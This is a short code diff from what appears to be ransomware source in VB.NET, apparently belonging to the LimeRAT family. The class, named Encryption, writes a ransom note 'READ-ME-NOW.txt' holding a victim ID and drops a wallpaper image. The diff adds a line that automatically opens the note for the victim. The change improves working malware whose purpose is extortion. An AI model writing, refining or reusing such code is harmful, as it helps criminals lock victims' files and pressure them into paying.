@@ -167,7 +167,7 @@ Public Class Encryption
             Dim fullpath As String = path + "\READ-ME-NOW.txt"
             Dim Message As String() = {Mynote, "Your ID is " & Main.BOT & ""}
             File.WriteAllLines(fullpath, Message)
-
+            Process.Start(fullpath)
 
             Dim MYW = IO.Path.GetTempPath + "\LimeWALL.jpeg"
             File.WriteAllBytes(MYW, Convert.FromBase64String(MYW))
